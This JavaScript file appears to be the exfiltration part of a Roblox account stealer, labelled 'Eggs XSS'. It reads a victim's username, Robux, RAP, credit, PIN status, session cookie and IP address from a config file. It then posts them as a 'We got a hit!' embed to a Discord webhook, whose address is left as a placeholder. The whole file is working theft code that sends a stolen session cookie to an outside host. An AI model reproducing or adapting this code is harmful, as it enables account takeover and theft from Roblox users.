fetch("./config.json") // path to the config file
.then(response => {return response.json();}).then(data => {
  userName = data.userName;
  userId = data.userId;
  userImage = data.userImage;
  // RAP info
  rap = data.RAPInfo.RAP;
  robux = data.RAPInfo.robux;
  credit = data.RAPInfo.credit;
  // other info
  premium = data.otherInfo.isPremium;
  status = data.otherInfo.status;
  pin = data.otherInfo.hasPin;
  // cookie & ip
  cookie = data.cookie;
  ip = data.ip;

  // craft the post request body
  body = {
  username: 'Eggs XSS',
  avatar_url: "https://images-ext-2.discordapp.net/external/nvj8MHK2_cgqtlVOiqMCMNukCESlOKCDgQhkaMi4GJM/%3Fsize%3D4096/https/cdn.discordapp.com/avatars/918196843341557800/cde31d687afbd652617b4109d16e3f8f.png",
      embeds: [
        {
          color: 6522815,
          title: 'We got a hit!',
          thumbnail: {
            url: userImage,
          },
          fields: [
            {
              name: 'Username',
              value: `> **${userName}**`
            },
            {
              name: "RAP",
              value: `> ${rap}`,
              inline: true
            },
            {
              name: "Robux",
              value: `> ${robux}`,
              inline: true
            },
            {
              name: "Credit",
              value: `> ${credit}`,
              inline: true
            },
            {
              name: "Is Premium",
              value: `> ${premium.toString().replace(premium.toString()[0], premium.toString()[0].toUpperCase())}`,
              inline: true
            },
            {
              name: "Status",
              value: `> ${status}`,
              inline: true
            },
            {
              name: "Has Pin",
              value: `> ${pin.toString().replace(pin.toString()[0], pin.toString()[0].toUpperCase())}`,
              inline: true
            },
            {
              name: "Rolimons",
              value: `https://www.rolimons.com/player/${userId}`,
            },
            {
              name: 'Cookie',
              value: '```' + cookie +'```',
            },
          ],
          footer: {
            text: `${ip}`, // optional in config.js 
          },
        },
      ],
    }
    fetch('WEBHOOK HERE',
  {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(body),
  }
);
});

// 9ggy was here
